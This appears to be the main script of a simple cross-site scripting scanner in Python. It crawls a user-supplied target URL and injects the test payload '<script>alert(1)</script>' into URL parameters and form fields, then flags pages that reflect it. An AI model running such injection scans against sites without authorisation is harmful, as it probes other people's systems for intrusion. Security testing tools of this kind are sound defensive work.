from core.crawler import WebCrawler
from core.injector import Injector
from core.detector import XSSDetector
from core.url_scanner import URLScanner


crawler = WebCrawler()

injector = Injector()


payload = "<script>alert(1)</script>"


target_url = input(
    "ENTER TARGET URL: "
)


links = crawler.get_links(
    target_url
)


all_urls = [target_url] + links


print(
    f"\n[+] Found {len(links)} links\n"
)


for link in links:

    print(f"[LINK] {link}")


for current_url in all_urls:

    print(
        f"\n[SCANNING] {current_url}"
    )

    # URL PARAMETER SCAN
    if "?" in current_url:

        response = URLScanner.scan_url(
            current_url,
            payload
        )

        is_vulnerable = XSSDetector.is_vulnerable(
            response,
            payload
        )

        if is_vulnerable:

            print(
                f"[URL VULNERABLE] {current_url}"
            )

    forms = crawler.get_forms(
        current_url
    )

    print(
        f"[+] Found {len(forms)} forms"
    )

    for form in forms:

        form_details = crawler.get_form_details(
            form
        )

        response = injector.submit_form(
            form_details,
            current_url,
            payload
        )

        is_vulnerable = XSSDetector.is_vulnerable(
            response,
            payload
        )

        if is_vulnerable:

            print("[VULNERABLE]")

            print(
                f"Payload : {payload}"
            )

            print(
                f"Method : {form_details['method']}"
            )

            print(
                f"Inputs : {form_details['inputs']}\n"
            )